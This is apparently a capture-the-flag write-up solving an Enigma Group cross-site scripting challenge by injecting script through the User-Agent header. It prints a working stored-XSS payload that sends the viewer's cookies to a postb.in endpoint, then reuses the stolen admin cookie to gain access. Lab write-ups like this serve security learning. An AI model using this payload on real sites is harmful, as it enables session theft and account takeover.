# [Basic 41](http://challenges.enigmagroup.org/basics/xss/2/)

So we just get a permission error where it displays our IP address and User Agent.

So knowing that this is a Cross Site Scripting challenge, we are trying to inject javascript 
somewhere on the page. What things that are displayed on this page can we control?

Well, we can spoof our user agent. Can we throw a script tag in there?

Well if we just throw an `alert()` it just gets printed on the screen.

What if it's a Stored XSS? If you see the message we get, it says our attempts have been "logged".

And it's in bold. So there's a hint. If we can inject a script that is run when the admin views the 
log. We could steal his cookies.

So I set up a throwaway endpoint using [postbin](https://postb.in)

Then I inject a little cookie stealing script. I change the User-Agent header to:

`<script>document.location='https://postb.in/1573138196601-6217692235950?c='+document.cookie</script>`

And voila! We get a message that says it worked. And we check our cookie stealer and we got it!

Now we can just open our console and run `document.cookie="admin=d02be8"`

And refresh the page and we pass!
